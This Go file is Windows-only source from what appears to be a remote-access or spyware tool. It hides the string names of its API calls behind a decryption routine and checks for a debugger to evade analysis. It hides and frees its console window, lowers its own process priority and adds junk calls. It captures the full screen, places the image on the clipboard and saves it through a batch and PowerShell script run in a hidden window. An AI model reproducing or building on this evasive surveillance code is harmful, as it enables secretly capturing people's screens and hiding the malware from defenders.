//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
)

func setHiddenWindow(cmd *exec.Cmd) {
	if cmd == nil {
		return
	}
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
}

func platformCheckDebug() bool {
	kernelLibLoad := syscall.NewLazyDLL(shiftDecrypt(kernelLib))
	debugProc := kernelLibLoad.NewProc(shiftDecrypt(debugCheckProc))
	ret, _, _ := debugProc.Call()
	return ret != 0
}

func platformHideTerminal() {
	kernelLibLoad := syscall.NewLazyDLL(shiftDecrypt(kernelLib))
	userLibLoad := syscall.NewLazyDLL(shiftDecrypt(userLib))

	proc := kernelLibLoad.NewProc(shiftDecrypt(getWindowProc))
	hwnd, _, _ := proc.Call()

	if hwnd != 0 {
		showProc := userLibLoad.NewProc(shiftDecrypt(showWindowProc))
		showProc.Call(hwnd, uintptr(hideFlag))
	}

	proc = kernelLibLoad.NewProc("FreeConsole")
	proc.Call()

	proc = kernelLibLoad.NewProc("SetPriorityClass")
	proc.Call(uintptr(os.Getpid()), 0x00004000)
	_ = time.Now().UnixNano() % 100
	_ = hashString("hide_junk")
}

func platformTakeSnapshot() string {
	userLibLoad := syscall.NewLazyDLL(shiftDecrypt(userLib))
	gdiLibLoad := syscall.NewLazyDLL(shiftDecrypt(gdiLib))
	metricsProc := userLibLoad.NewProc(shiftDecrypt(getMetricsProc))
	width, _, _ := metricsProc.Call(0)
	height, _, _ := metricsProc.Call(1)
	dcProc := userLibLoad.NewProc(shiftDecrypt(getDCProc))
	dc, _, _ := dcProc.Call(0)
	compatDCProc := gdiLibLoad.NewProc(shiftDecrypt(createDCProc))
	memDC, _, _ := compatDCProc.Call(dc)
	compatBitmapProc := gdiLibLoad.NewProc(shiftDecrypt(createBitmapProc))
	bitmap, _, _ := compatBitmapProc.Call(dc, width, height)
	selectProc := gdiLibLoad.NewProc(shiftDecrypt(selectObjProc))
	selectProc.Call(memDC, bitmap)
	copyProc := gdiLibLoad.NewProc(shiftDecrypt(bitCopyProc))
	copyProc.Call(memDC, 0, 0, width, height, dc, 0, 0, uintptr(copyFlag))
	filename := fmt.Sprintf("snapshot_%d.bmp", time.Now().Unix())
	currentDir, err := os.Getwd()
	if err != nil {
		currentDir = "."
	}
	fullPath := filepath.Join(currentDir, filename)
	openClip := userLibLoad.NewProc(shiftDecrypt(openClipProc))
	emptyClip := userLibLoad.NewProc(shiftDecrypt(emptyClipProc))
	setClip := userLibLoad.NewProc(shiftDecrypt(setClipProc))
	closeClip := userLibLoad.NewProc(shiftDecrypt(closeClipProc))
	openClip.Call(0)
	emptyClip.Call()
	setClip.Call(uintptr(bitmapFlag), bitmap)
	closeClip.Call()
	batchContent := fmt.Sprintf(`@echo off
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $clipboard = [System.Windows.Forms.Clipboard]::GetImage(); if ($clipboard) { $clipboard.Save('%s', [System.Drawing.Imaging.ImageFormat]::Bmp); Write-Host 'Snapshot saved successfully' } else { Write-Host 'Failed to capture snapshot' }"`, fullPath)
	batchPath := filepath.Join(os.TempDir(), "snapshot.bat")
	err = os.WriteFile(batchPath, []byte(batchContent), 0644)
	if err != nil {
		return fmt.Sprintf("Failed to create snapshot script: %v", err)
	}
	cmd := exec.Command("cmd", "/c", batchPath)
	setHiddenWindow(cmd)
	cmd.Run()
	os.Remove(batchPath)
	delObjProc := gdiLibLoad.NewProc(shiftDecrypt(deleteObjProc))
	delDCProc := gdiLibLoad.NewProc(shiftDecrypt(deleteDCProc))
	relDCProc := userLibLoad.NewProc(shiftDecrypt(releaseDCProc))
	delObjProc.Call(bitmap)
	delDCProc.Call(memDC)
	relDCProc.Call(0, dc)
	_ = hashString("snapshot_junk")
	return fmt.Sprintf("Snapshot saved as: %s", fullPath)
}
